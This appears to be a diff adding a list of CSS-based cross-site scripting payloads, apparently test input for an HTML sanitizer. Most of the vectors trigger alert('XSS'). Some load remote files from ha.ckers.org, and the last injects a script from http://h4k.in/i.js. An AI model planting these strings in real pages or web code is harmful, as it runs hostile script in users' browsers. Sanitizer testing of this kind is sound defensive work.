@@ -1,0 +1,17 @@
+<a href="http://www.google.com" target'=_blank"></a>
+
+// CSS
+<style>@import'http://ha.ckers.org/xss.css';</style>
+<style>@im\port'\ja\vasc\ript:alert("XSS")';</style>
+<style>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</style>
+<img style="xss:expr/*XSS*/ession(alert('XSS'))">
+<style TYPE="text/javascript">alert('XSS');</style>
+<style>.XSS{background-image:url("javascript:alert('XSS')");}</style><A CLASS=XSS></A>
+<style type="text/css">BODY{background:url("javascript:alert('XSS')")}</style>
+<XSS style="xss:expression(alert('XSS'))">
+<XSS style="behavior: url(xss.htc);">
+<XSS style="behavior: URL(xss.htc);">
+<div style="width: expression(alert('XSS'));">
+<div style="width: eXpreSsion(alert('XSS'));">
+<img style="xss:expr/*XSS*/ession(alert('XSS'))">
+<a style="xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"></a>
